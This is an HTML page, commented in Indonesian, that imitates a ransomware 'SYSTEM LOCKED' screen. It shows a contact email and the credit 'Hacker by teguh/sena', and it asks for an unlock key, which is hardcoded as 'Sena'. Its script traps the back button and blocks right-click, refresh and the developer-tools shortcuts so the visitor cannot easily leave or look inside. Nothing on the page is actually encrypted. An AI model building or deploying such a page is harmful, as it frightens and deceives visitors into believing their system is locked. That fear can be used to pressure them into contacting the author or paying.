<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>‚ö†Ô∏è SYSTEM LOCKED</title>
  <style>
    body, html {
      margin: 0; padding: 0; overflow: hidden;
      font-family: 'Courier New', monospace;
      background: black; color: white;
    }
    #bg-video {
      position: fixed; top: 0; left: 0;
      width: 100vw; height: 100vh; object-fit: cover;
      z-index: -1; opacity: 0.6;
    }
    .container {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }
    .title {
      font-size: 2.5em; color: red;
      text-shadow: 2px 2px 10px black;
    }
    .desc {
      margin: 20px 0; font-size: 1.2em;
    }
    .btc {
      margin-top: 20px; font-weight: bold; color: yellow;
    }
    input {
      padding: 10px; font-size: 1em; border: none;
      outline: none; margin-top: 15px; text-align: center;
      background: rgba(0,0,0,0.7); color: white;
    }
    button {
      padding: 10px 20px; margin-left: 10px;
      font-size: 1em; background: red; color: white;
      border: none; cursor: pointer;
    }
    .status {
      margin-top: 20px; font-weight: bold;
    }
  </style>
</head>
<body>

  <!-- Ganti video background -->
  <video autoplay muted loop id="bg-video">
    <source src="https://a.top4top.io/m_3505swto20.mp4" type="video/mp4" />
  </video>

  <div class="container">
    <h1 class="title">üî• Mau kebuka?</h1>
    <p class="desc">hubungi saya ssenaoffc@gmail.com</p>
    <input type="password" id="keyInput" placeholder="Enter key..." />
    <button onclick="checkKey()">Unlock</button>
    <div class="btc">Hacker by teguh/sena</div>
    <p class="status" id="statusText"></p>
  </div>

  <!-- Audio -->
  <audio id="audio" src="https://k.top4top.io/m_3494ljws70.mp4"></audio>

  <script>
    // Blok tombol BACK
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      history.go(1);
    };

    // Cek input kunci
    function checkKey() {
      const input = document.getElementById('keyInput').value;
      const statusText = document.getElementById('statusText');
      const audio = document.getElementById('audio');
      const kunciBenar = "Sena"; // Ganti sesuai keinginan

      if (input === kunciBenar) {
        statusText.innerText = "‚úÖ Decryption successful. Welcome back.";
        statusText.style.color = "lightgreen";
        audio.play();
      } else {
        statusText.innerText = "‚ùå Incorrect key. Try again!";
        statusText.style.color = "red";
        audio.play();
      }
    }

    // Blok klik kanan
    document.addEventListener("contextmenu", function(e) {
      e.preventDefault();
    });

    // Blok shortcut devtools dan refresh
    document.addEventListener("keydown", function(e) {
      if (
        e.key === "F5" ||
        e.key === "F12" ||
        e.key === "Escape" ||
        (e.ctrlKey && e.key.toLowerCase() === "r") ||
        (e.ctrlKey && e.key.toLowerCase() === "u") ||
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") ||
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "j")
      ) {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
